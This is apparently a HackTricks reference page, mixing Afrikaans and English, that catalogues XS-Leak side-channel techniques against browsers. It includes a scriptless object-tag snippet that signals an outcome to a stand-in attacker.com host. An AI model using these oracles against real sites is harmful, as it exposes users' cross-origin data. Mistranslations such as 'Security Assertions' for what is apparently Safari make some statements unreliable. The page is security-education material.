# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Gebruik [****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) om maklik **werkvloei** te bou en te **automate** wat aangedryf word deur die w√™reld se **mees gevorderde** gemeenskapstools.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

XS-Search is 'n metode wat gebruik word om **kruis-oorsprong inligting** te **onttrek** deur gebruik te maak van **kantkanaal kwesbaarhede**.

Belangrike komponente wat betrokke is by hierdie aanval sluit in:

* **Kwetsbare Web**: Die teikenwebwerf waaruit inligting onttrek moet word.
* **Aanvaller se Web**: Die kwaadwillige webwerf wat deur die aanvaller geskep is, wat die slagoffer besoek en die ontploffing huisves.
* **Insluitingsmetode**: Die tegniek wat gebruik word om die Kwetsbare Web in die Aanvaller se Web in te sluit (bv. window.open, iframe, fetch, HTML-tag met href, ens.).
* **Lek Tegniek**: Tegnieke wat gebruik word om verskille in die toestand van die Kwetsbare Web te onderskei op grond van inligting wat deur die insluitingsmetode versamel is.
* **Toestande**: Die twee potensi√´le toestande van die Kwetsbare Web, wat die aanvaller poog om te onderskei.
* **Waarneembare Verskille**: Waarneembare variasies waarop die aanvaller staatmaak om die toestand van die Kwetsbare Web af te lei.

### Waarneembare Verskille

Verskeie aspekte kan geanaliseer word om die toestande van die Kwetsbare Web te onderskei:

* **Statuskode**: Onderskeiding tussen **verskeie HTTP-responsstatuskodes** kruis-oorsprong, soos bedienerfoute, kli√´ntfoute, of outentikasiefoute.
* **API Gebruik**: Identifisering van **gebruik van Web API's** oor bladsye, wat onthul of 'n kruis-oorsprong bladsy 'n spesifieke JavaScript Web API gebruik.
* **Herlidings**: Opspoor van navigasies na verskillende bladsye, nie net HTTP-herleidings nie, maar ook di√© wat deur JavaScript of HTML geaktiveer word.
* **Bladsy Inhoud**: Waarneming van **verskille in die HTTP-responsliggaam** of in bladsy sub-hulpbronne, soos die **aantal ingeslote rame** of grootteverskille in beelde.
* **HTTP Kop**: Notering van die teenwoordigheid of moontlik die waarde van 'n **spesifieke HTTP-responskop**, insluitend koppe soos X-Frame-Options, Content-Disposition, en Cross-Origin-Resource-Policy.
* **Tydsduur**: Opmerking van konsekwente tydverskille tussen die twee toestande.

### Insluitingsmetodes

* **HTML Elemente**: HTML bied verskeie elemente vir **kruis-oorsprong hulpbroninsluiting**, soos stylesheets, beelde, of skripte, wat die blaaiers dwing om 'n nie-HTML hulpbron aan te vra. 'n Samevatting van potensi√´le HTML-elemente vir hierdie doel kan gevind word by [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Rame**: Elemente soos **iframe**, **object**, en **embed** kan HTML-hulpbronne direk in die aanvaller se bladsy insluit. As die bladsy **raam beskerming ontbreek**, kan JavaScript toegang verkry tot die ingeslote hulpbron se venster objek via die contentWindow eienskap.
* **Pop-ups**: Die **`window.open`** metode open 'n hulpbron in 'n nuwe oortjie of venster, wat 'n **vensterhandvatsel** bied vir JavaScript om met metodes en eienskappe te kommunikeer volgens die SOP. Pop-ups, wat dikwels in enkel aanmelding gebruik word, omseil raam- en koekiebeperkings van 'n teikenhulpbron. Modern blaaiers beperk egter die skepping van pop-ups tot sekere gebruikersaksies.
* **JavaScript Versoeke**: JavaScript laat direkte versoeke aan teikenhulpbronne toe met behulp van **XMLHttpRequests** of die **Fetch API**. Hierdie metodes bied presiese beheer oor die versoek, soos om te kies om HTTP-herleidings te volg.

### Lek Tegnieke

* **Gebeurtenis Handler**: 'n Klassieke lek tegniek in XS-Leaks, waar gebeurtenis handlers soos **onload** en **onerror** insigte bied oor hulpbronlaai sukses of mislukking.
* **Foutboodskappe**: JavaScript uitsonderings of spesiale foutbladsye kan lek inligting bied, hetsy direk van die foutboodskap of deur die teenwoordigheid en afwesigheid daarvan te onderskei.
* **Globale Beperkings**: Fisiese beperkings van 'n blaier, soos geheue kapasiteit of ander afgedwonge blaierbeperkings, kan aandui wanneer 'n drempel bereik is, wat as 'n lek tegniek dien.
* **Globale Toestand**: Waarneembare interaksies met blaier se **globale toestande** (bv. die Geskiedenis-koppelvlak) kan uitgebuit word. Byvoorbeeld, die **aantal inskrywings** in 'n blaier se geskiedenis kan leidrade bied oor kruis-oorsprong bladsye.
* **Prestasie API**: Hierdie API bied **prestasie besonderhede van die huidige bladsy**, insluitend netwerk tydsduur vir die dokument en gelaaide hulpbronne, wat afleidings oor versoekte hulpbronne moontlik maak.
* **Leesbare Eienskappe**: Sommige HTML-eienskappe is **leesbaar kruis-oorsprong** en kan as 'n lek tegniek gebruik word. Byvoorbeeld, die `window.frame.length` eienskap laat JavaScript toe om die rame wat in 'n webblad kruis-oorsprong ingesluit is, te tel.

## XSinator Tool & Papier

XSinator is 'n outomatiese hulpmiddel om **blaaiers teen verskeie bekende XS-Leaks** te **kontroleer** soos verduidelik in sy papier: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Jy kan **die hulpmiddel toegang** in [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Uitsluit XS-Leaks**: Ons moes XS-Leaks uitsluit wat staatmaak op **dienswerkers** aangesien dit ander lekke in XSinator sou inmeng. Verder het ons besluit om **XS-Leaks wat staatmaak op miskonfigurasie en foute in 'n spesifieke webtoepassing** uit te sluit. Byvoorbeeld, CrossOrigin Resource Sharing (CORS) miskonfigurasies, postMessage lekkasies of Cross-Site Scripting. Daarbenewens het ons tydgebaseerde XS-Leaks uitgesluit aangesien hulle dikwels ly aan stadigheid, geraas en onakkuraatheid.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) om maklik **werkvloei** te bou en te **automate** wat aangedryf word deur die w√™reld se **mees gevorderde** gemeenskapstools.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **Tydgebaseerde tegnieke**

Sommige van die volgende tegnieke gaan tyd gebruik as deel van die proses om verskille in die moontlike toestande van die webbladsye te detecteer. Daar is verskillende maniere om tyd in 'n webblaaier te meet.

**Horlosies**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API laat ontwikkelaars toe om ho√´-resolusie tydsmetings te verkry.\
Daar is 'n aansienlike aantal API's wat aanvallers kan misbruik om implisiete horlosies te skep: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasies, en ander.\
Vir meer inligting: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Gebeurtenis Handler Tegnieke

### Onload/Onerror

* **Insluitingsmetodes**: Rame, HTML Elemente
* **Waarneembare Verskil**: Statuskode
* **Meer inligting**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Opsomming**: as 'n hulpbron probeer laai, word onerror/onload gebeurtenisse geaktiveer wanneer die hulpbron suksesvol/misluk laai, is dit moontlik om die statuskode uit te vind.
* **Kode voorbeeld**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Die kode voorbeeld probeer om **scripts objek van JS** te **laai**, maar **ander tags** soos objek, stylesheets, beelde, klank kan ook gebruik word. Boonop is dit ook moontlik om die **tag direk** in te voeg en die `onload` en `onerror` gebeurtenisse binne die tag te verklaar (in plaas daarvan om dit van JS in te voeg).

Daar is ook 'n skrip-vrye weergawe van hierdie aanval:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In hierdie geval, as `example.com/404` nie gevind word nie, sal `attacker.com/?error` gelaai word.

### Onload Timing

* **Insluitingsmetodes**: HTML Elemente
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Opsomming:** Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan ook gebruik word, soos [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) wat take kan identifiseer wat langer as 50ms duur.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) 'n Ander voorbeeld in:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Gedwonge Zware Taak

Hierdie tegniek is net soos die vorige een, maar die **aanvaller** sal ook **dwing** dat 'n aksie 'n **relevante hoeveelheid tyd** neem wanneer die **antwoord positief of negatief** is en daardie tyd meet.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Opsomming:** Die [SharedArrayBuffer horlosie](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan ook gebruik word.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die tyd wat geneem word om 'n hulpbron te verkry, kan gemeet word deur die [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) en [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) gebeurtenisse te benut. Die **`beforeunload`** gebeurtenis word geaktiveer wanneer die blaaskas op die punt is om na 'n nuwe bladsy te navigeer, terwyl die **`unload`** gebeurtenis plaasvind wanneer die navigasie werklik plaasvind. Die tydverskil tussen hierdie twee gebeurtenisse kan bereken word om die **duur wat die blaaskas spandeer het om die hulpbron te verkry** te bepaal.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Insluitingsmetodes**: Raamwerke
* **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
* **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Opsomming:** Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kan gebruik word om te meet hoe lank dit neem om 'n versoek uit te voer. Ander horlosies kan ook gebruik word.
* **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Daar is waargeneem dat in die afwesigheid van [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), die tyd wat benodig word vir 'n bladsy en sy subhulpbronne om oor die netwerk te laai, deur 'n aanvaller gemeet kan word. Hierdie meting is tipies moontlik omdat die `onload` handler van 'n iframe slegs geaktiveer word na die voltooiing van hulpbronlaai en JavaScript-uitvoering. Om die variasie wat deur skripuitvoering ingebring word te omseil, kan 'n aanvaller die [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribuut binne die `<iframe>` gebruik. Die insluiting van hierdie attribuut beperk verskeie funksies, veral die uitvoering van JavaScript, wat 'n meting fasiliteer wat hoofsaaklik deur netwerkprestasie be√Ønvloed word.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**:
* **Summary**: As jy die bladsy kan laat fout wanneer die korrekte inhoud toeganklik is en dit korrek kan laai wanneer enige inhoud toeganklik is, kan jy 'n lus maak om al die inligting te onttrek sonder om die tyd te meet.
* **Code Example**:

Suppose that you can **insert** the **page** that has the **secret** content **inside an Iframe**.

You can **make the victim search** for the file that contains "_**flag**_" using an **Iframe** (exploiting a CSRF for example). Inside the Iframe you know that the _**onload event**_ will be **executed always at least once**. Then, you can **change** the **URL** of the **iframe** but changing only the **content** of the **hash** inside the URL.

For example:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

If the first URL was **successfully loaded**, then, when **changing** the **hash** part of the URL the **onload** event **won't be triggered** again. But **if** the page had some kind of **error** when **loading**, then, the **onload** event will be **triggered again**.

Then, you can **distinguish between** a **correctly** loaded page or page that has an **error** when is accessed.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**:
* **Summary:** If the **page** is **returning** the **sensitive** content, **or** a **content** that can be **controlled** by the user. The user could set **valid JS code in the negative case**, an **load** each try inside **`<script>`** tags, so in **negative** cases attackers **code** is **executed,** and in **affirmative** cases **nothing** will be executed.
* **Code Example:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Statuskode & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** is a security measure that prevents web pages from loading certain sensitive cross-origin resources to protect against attacks like **Spectre**. However, attackers can exploit its protective behavior. When a response subject to **CORB** returns a _**CORB protected**_ `Content-Type` with `nosniff` and a `2xx` status code, **CORB** strips the response's body and headers. Attackers observing this can infer the combination of the **status code** (indicating success or error) and the `Content-Type` (denoting whether it's protected by **CORB**), leading to potential information leakage.
* **Code Example**:

Check the more information link for more information about the attack.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Lek sensitiewe data uit die id of naam attribuut.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

It's possible to **load a page** inside an **iframe** and use the **`#id_value`** to make the page **focus on the element** of the iframe with indicated if, then if an **`onblur`** signal is triggered, the ID element exists.\
You can perform the same attack with **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Versamel sensitiewe inligting uit 'n postMessage of gebruik die teenwoordigheid van postMessages as 'n orakel om die status van die gebruiker op die bladsy te ken.
* **Code Example**: `Any code listening for all postMessages.`

Applications frequently utilize [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate across different origins. However, this method can inadvertently expose **sensitive information** if the `targetOrigin` parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving a message can act as an **oracle**; for instance, certain messages might only be sent to users who are logged in. Therefore, the presence or absence of these messages can reveal information about the user's state or identity, such as whether they are authenticated or not.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Die uitputting van die WebSocket verbinding limiet lek die aantal WebSocket verbindings van 'n cross-origin bladsy.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

It is possible to identify if, and how many, **WebSocket connections a target page uses**. It allows an attacker to detect application states and leak information tied to the number of WebSocket connections.

If one **origin** uses the **maximum amount of WebSocket** connection objects, regardless of their connections state, the creation of **new objects will result in JavaScript exceptions**. To execute this attack, the attacker website opens the target website in a pop-up or iframe and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible. The **number of thrown exceptions** is the **number of WebSocket connections used by the target website** window.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: API Gebruik
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Detect Payment Request because only one can be active at a time.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

This XS-Leak enables an attacker to **detect when a cross-origin page initiates a payment request**.

Because **only one request payment can be active** at the same time, if the target website is using the Payment Request API, any f**urther attempts to show use this API will fail**, and cause a **JavaScript exception**. The attacker can exploit this by **periodically attempting to show the Payment API UI**. If one attempt causes an exception, the target website is currently using it. The attacker can hide these periodical attempts by immediately closing the UI after creation.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tydsduur (generally due to Page Content, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Meet die uitvoer tyd van 'n web wat die enkel-draad JS gebeurtenislus misbruik.
* **Code Example**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript operates on a [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) concurrency model, signifying that **it can only execute one task at a time**. This characteristic can be exploited to gauge **how long code from a different origin takes to execute**. An attacker can measure the execution time of their own code in the event loop by continuously dispatching events with fixed properties. These events will be processed when the event pool is empty. If other origins are also dispatching events to the same pool, an **attacker can infer the time it takes for these external events to execute by observing delays in the execution of their own tasks**. This method of monitoring the event loop for delays can reveal the execution time of code from different origins, potentially exposing sensitive information.

{% hint style="warning" %}
In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tydsduur (generally due to Page Content, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** One method to measure the execution time of a web operation involves intentionally blocking the event loop of a thread and then timing **how long it takes for the event loop to become available again**. By inserting a blocking operation (such as a long computation or a synchronous API call) into the event loop, and monitoring the time it takes for subsequent code to begin execution, one can infer the duration of the tasks that were executing in the event loop during the blocking period. This technique leverages the single-threaded nature of JavaScript's event loop, where tasks are executed sequentially, and can provide insights into the performance or behavior of other operations sharing the same thread.
* **Code Example**:

A significant advantage of the technique of measuring execution time by locking the event loop is its potential to circumvent **Site Isolation**. **Site Isolation** is a security feature that separates different websites into separate processes, aiming to prevent malicious sites from directly accessing sensitive data from other sites. However, by influencing the execution timing of another origin through the shared event loop, an attacker can indirectly extract information about that origin's activities. This method does not rely on direct access to the other origin's data but rather observes the impact of that origin's activities on the shared event loop, thus evading the protective barriers established by **Site Isolation**.

{% hint style="warning" %}
In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Versoeke
* **Detectable Difference**: Tydsduur (generally due to Page Content, Statuskode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** An attacker could lock all the sockets except 1, load the target web and at the same time load another page, the time until the last page is starting to load is the time the target page took to load.
* **Code Example**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Browsers utilize sockets for server communication, but due to the limited resources of the operating system and hardware, **browsers are compelled to impose a limit** on the number of concurrent sockets. Attackers can exploit this limitation through the following steps:

1. Ascertain the browser's socket limit, for instance, 256 global sockets.
2. Occupy 255 sockets for an extended duration by initiating 255 requests to various hosts, designed to keep the connections open without completing.
3. Employ the 256th socket to send a request to the target page.
4. Attempt a 257th request to a different host. Given that all sockets are in use (as per steps 2 and 3), this request will be queued until a socket becomes available. The delay before this request proceeds provides the attacker with timing information about the network activity related to the 256th socket (the target page's socket). This inference is possible because the 255 sockets from step 2 are still engaged, implying that any newly available socket must be the one released from step 3. The time taken for the 256th socket to become available is thus directly linked to the time required for the request to the target page to complete.

For more info: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Versoeke
* **Detectable Difference**: Tydsduur (generally due to Page Content, Statuskode)
* **More info**:
* **Summary:** It's like the previous technique but instead of using all the sockets, Google **Chrome** puts a limit of **6 concurrent request to the same origin**. If we **block 5** and then **launch a 6th** request we can **time** it and if we managed to make the **victim page send** more **requests** to the same endpoint to detect a **status** of the **page**, the **6th request** will take **longer** and we can detect it.

## Performance API Techniques

The [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offers insights into the performance metrics of web applications, further enriched by the [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). The Resource Timing API enables the monitoring of detailed network request timings, such as the duration of the requests. Notably, when servers include the `Timing-Allow-Origin: *` header in their responses, additional data like the transfer size and domain lookup time becomes available.

This wealth of data can be retrieved via methods like [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) or [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), providing a comprehensive view of performance-related information. Additionally, the API facilitates the measurement of execution times by calculating the difference between timestamps obtained from [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). However, it's worth noting that for certain operations in browsers like Chrome, the precision of `performance.now()` may be limited to milliseconds, which could affect the granularity of timing measurements.

Beyond timing measurements, the Performance API can be leveraged for security-related insights. For instance, the presence or absence of pages in the `performance` object in Chrome can indicate the application of `X-Frame-Options`. Specifically, if a page is blocked from rendering in a frame due to `X-Frame-Options`, it will not be recorded in the `performance` object, providing a subtle clue about the page's framing policies.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** A request that results in errors will not create a resource timing entry.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

It is possible to **differentiate between HTTP response status codes** because requests that lead to an **error** do **not create a performance entry**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Due to a browser bug, requests that result in errors are loaded twice.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In the previous technique it was also identified two cases where browser bugs in GC lead to **resources being loaded twice when they fail to load**. This will result in multiple entries in the Performance API and can thus be detected.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Statuskode
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Requests that result in an error can not be merged.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

The technique was found in a table in the mentioned paper but no description of the technique was found on it. However, you can find the source code checking for it in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Le√´ antwoorde skep nie hulpbron tydsduur inskrywings nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

An attacker can detect if a request resulted in an empty HTTP response body because e**mpty pages do not create a performance entry in some browsers**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Bladsy Inhoud
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Using the XSS Auditor in Security Assertions, attackers can detect specific webpage elements by observing alterations in responses when crafted payloads trigger the auditor's filtering mechanism.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Security Assertions (SA), the XSS Auditor, originally intended to prevent Cross-Site Scripting (XSS) attacks, can paradoxically be exploited to leak sensitive information. Although this built-in feature was removed from Google Chrome (GC), it's still present in SA. In 2013, Braun and Heiderich demonstrated that the XSS Auditor could inadvertently block legitimate scripts, leading to false positives. Building on this, researchers developed techniques to extract information and detect specific content on cross-origin pages, a concept known as XS-Leaks, initially reported by Terada and elaborated by Heyes in a blog post. Although these techniques were specific to the XSS Auditor in GC, it was discovered that in SA, pages blocked by the XSS Auditor do not generate entries in the Performance API, revealing a method through which sensitive information might still be leaked.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Hulpbron met X-Frame-Options header skep nie hulpbron tydsduur inskrywing nie.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

If a page is **not allowed** to be **rendered** in an **iframe** it does **not create a performance entry**. As a result, an attacker can detect the response header **`X-Frame-Options`**.\
Same happens if you use an **embed** **tag.**

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
